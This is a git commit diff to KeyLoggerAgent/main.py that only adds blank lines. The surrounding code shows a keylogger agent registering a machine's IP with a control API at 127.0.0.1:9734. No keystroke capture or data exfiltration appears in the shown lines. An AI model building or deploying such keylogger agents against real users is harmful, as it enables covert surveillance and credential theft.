9443b2a6ac7cde7dc90fa874fa709388258b4d57
moishy shuvax <moishy.shuvax@gmail.com>
2025-02-18 12:13:54 +0200

    18/02/2025

--- KeyLoggerAgent/main.py
+++ KeyLoggerAgent/main.py
@@ -2,6 +2,8 @@ import manager as keylogger
 import requests
 
 url = 'http://127.0.0.1:9734/api/create_machine'
+
+
 def create_logger():
     data = {
         "ip": "127.0.0.1"
@@ -14,6 +16,7 @@ def create_logger():
         return response.status_code == 200
     except requests.exceptions.RequestException:
         return False
+
 
 if __name__ == "__main__":
     print(create_logger())
